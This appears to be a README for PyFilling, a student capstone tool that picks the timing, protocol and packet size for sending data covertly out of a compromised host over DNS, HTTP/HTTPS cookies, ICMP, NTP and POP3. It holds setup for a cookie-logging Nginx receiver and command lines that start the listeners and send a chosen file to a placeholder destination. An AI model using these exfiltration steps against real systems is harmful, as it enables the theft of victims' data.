# PyFilling
PyFilling is the Capstone project of  @supermcpeanut, @a-levsky, & @tchrinder. PyFilling was designed to explore the possibility of developing an automated tool that can identify the optimal time, protocol, and packet size to perform data exfiltration on a compromised host based on its normal network traffic.

## Quick Overview
![Alt text](InternalStructure_PyFilling.jpg?raw=true "Internal Structure Overview")

*  Exfiltration Protocols
    *  DNS
    *  HTTP Cookie
    *  HTTPS Cookie
    *  ICMP
    *  NTP
    *  POP3 Authentication

## Installation & Preparation
In order to preform the exfiltration, the following steps are required:

- We wanted to use as few python servers as possible, as such we relied on Nginx to capture incoming cookies
    *  A simple method of installing and configuring Nginx on Ubuntu can be found [here](https://www.digitalocean.com/community/tutorials/how-to-install-nginx-on-ubuntu-16-04 "Digital Ocean Setup")

    *  If Nginx is used the following changes to etc/nginx/nginx.conf are required
```bash
    ##
    # Logging Settings
    ##
    log_format main '"cookies=$http_cookie;"';
    access_log /var/log/nginx/access.log main;
    error_log /var/log/nginx/error.log;
```
*It should be noted that this change will make the access_log only log cookies.*

*Addtionally to properly use our HTTPS exfiltration the server should have a certificate and an innocuous domain name.*

*Certbot makes it trivial to register a cert, found* [here](https://certbot.eff.org/ "Certbot Setup")

## Running the listeners
All the Protocol listeners/servers need to be setup.
```bash
# serve.py:
# "-a", "--address": Used to specify the IP address or domain name
# "-i", "--protocol": Used to specify the listener protocol
# "-s", "--size": Not used anymore, previously used to specify the size of the receiving
python3 serve.py -a "<IP or Domain Name>" -i "DNS"
python3 serve.py -a "<IP or Domain Name>" -i "NTP"
python3 serve.py -a "<IP or Domain Name>" -i "POP3"
python3 serve.py -a "<IP or Domain Name>" -i "ICMP"
```

## Performing exfiltration
Performing exfiltration can be done in one of two methods:

*  By using PAS to conduct packet analysis and automate the exfiltration
```python
pip install -r requirements.txt
./pas.py
```
*  or by using the exfiltrator independently of PAS
```bash
# "-d", "--destination": Used to specify the destination IP address or domain name which the exfiltrated data will be sent too.
# "-f", "--file": Used to specify the file that will be exfiltrated
# "-i", "--protocol": Used to specify the protocol used during exfiltration
# "-s", "--size": Used to specify the size of each packet to be sent
./exfiltrator -d "<IP or Domain Name>" -f "<filename>" -i "protocol" -s <size>
python3 exfiltrator.py -d "<IP or Domain Name>" -f "<filename>" -i "protocol" -s <size>
```

## Acknowledgements
We wanted to thank the following people:

*  Anyone who had to put up with the stress of Adam slowly losing his mind. 
*  Nick for the general guidance & support. 
*  The works of @ytisf made building the exfiltration modules simpler.
*  De Mello Palheta for the immeasurable number of 4-shot americanos consumed.
*  Maker Pizza for the numerous pizzas eaten.
*  Lastly, @bitofeverything for coming up with the name PyFilling.  
